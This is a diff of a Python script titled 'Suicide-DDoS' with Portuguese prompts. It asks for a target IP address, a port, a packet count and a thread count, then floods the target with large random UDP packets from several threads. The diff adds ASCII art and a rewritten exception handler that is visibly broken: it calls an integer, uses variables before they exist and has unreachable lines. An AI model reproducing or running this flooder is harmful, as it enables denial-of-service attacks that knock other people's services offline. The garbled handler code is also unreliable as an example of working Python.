@@ -4,20 +4,31 @@ import os
 import time
 import threading
 
-print("  Suicide-DDoS  \n  by: t4ucci\n")
-
-print("┏┓┃┃┏┫┣┓┃┃┃┃┗┓┏┘\n")
+print("  Suicide-DDoS  \n  by: t4ucci")
+print("""
+░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
+░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
+░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
+░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
+░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
+█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
+█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
+░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
+░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
+░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
+░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
+░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
+░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
+░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
+░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
+""")
 
 print("Iniciando programa..")
 
-time.sleep(1)
-print("\n1..")
-time.sleep(1)
-print("2..")
-time.sleep(1)
-print("3..\n")
-time.sleep(1)
-
+for i in range(3+1):
+    time.sleep(1)
+    print(f"\n{i}..")
+    
 print("\n   Divirta-se!\n")
 
 ip = str(input("[♤] Endereço: "))
@@ -25,9 +36,11 @@ port = int(input("[♤] Porta: "))
 packs = int(input("[♤] Quant. Pacotes: "))
 thread = int(input("[♤] Velocidade do Envio: "))
 
+#DIGITE OS DADOS ACIMA
+  
 def start():
     bytes = random._urandom(25000)
-    envios = int(0)
+    envios = 0
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -37,14 +50,19 @@ def start():
                 envios += 1
                 print('Atacando agora: '+ip+' || Enviando: '+str(envios))
         except:
-             s.close()
-             print("\nTirando do ar...\n")
-             if not packs:
-                 sendto(bytes, (ip, port))
-                 print('Atacando agora: '+ip+' || Enviando: '+str(envios))
+             if not packs(pergunta):
+                    break
+                    pergunta = str(input("Voltar?: [S/N]"))
+             elif pergunta == 'S':
+                    s.sendto(bytes(ip,port))
+                    envios += 1
+                    print('Atacando agora: '+ip+' || Enviando:'+str(envio))
              else:
-                 print("\nFim do ataque.\n")
-                 break
+                  print("[♤] O ataque está procedendo...")
+                  s.close()
+                  break
+        s.close()
+        print(">>> O ataque pode fechar em breve!")
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
